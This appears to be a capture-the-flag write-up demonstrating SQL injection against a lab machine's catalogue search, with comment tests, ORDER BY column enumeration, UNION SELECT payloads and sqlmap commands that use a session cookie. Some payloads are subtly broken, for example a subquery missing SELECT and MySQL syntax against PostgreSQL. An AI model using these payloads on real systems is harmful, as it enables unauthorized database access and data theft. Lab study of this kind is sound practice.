once we log in we get a catalogue with a search field.

entering a quote mark ' gives us this error:

`ERROR: unterminated quoted string at or near "'" LINE 1: Select \* from cars where name ilike '%a%'--%' ^`

`ERROR: syntax error at or near "bbbb" LINE 1: Select \* from cars where name ilike '%aaaa'bbbb%' ^`


We need to test a couple of things for sqli.
First we need to see what comments the rest of the query out

`/*`  `#` `--` are all ways to comment out the rest of the query

We test this by inputting `a%' <comment>`

We see that `--` comments the rest of the query out

---

Next we need to enumerate the number of columns.
`a%' ORDER BY <#> --`

First we try 10 columns
`a%' ORDER BY 10 --` - we get an error message
Then we try 5
`a%' ORDER BY 5--` - we get a result
If we try anything higher than 5 we get an error.

We now know there are 5 columns.

---

1)  we have injection
2)  we know how many columns there are


```
a%' UNION ALL SELECT NULL,(where table_schema = 'information_schema'),null,null,null--
```

```
a%' UNION ALL SELECT NULL,(select group_concat(table_name) from information_schema.tables),null,null,null--
```


---

We used sqlmap to enumerate the databases

```
qlmap -u http://10.10.10.46/dashboard.php?search=asdf --cookie=PHPSESSID=358c77u1tagqmghqqhbe8v4omd
```


```
[*] information_schema
[*] pg_catalog
[*] public
```

---

We enumerate the tables in `pg_catalog`

`sqlmap -u http://10.10.10.46/dashboard.php?search=asdf --cookie=PHPSESSID=358c77u1tagqmghqqhbe8v4omd -D pg_catalog -tables`




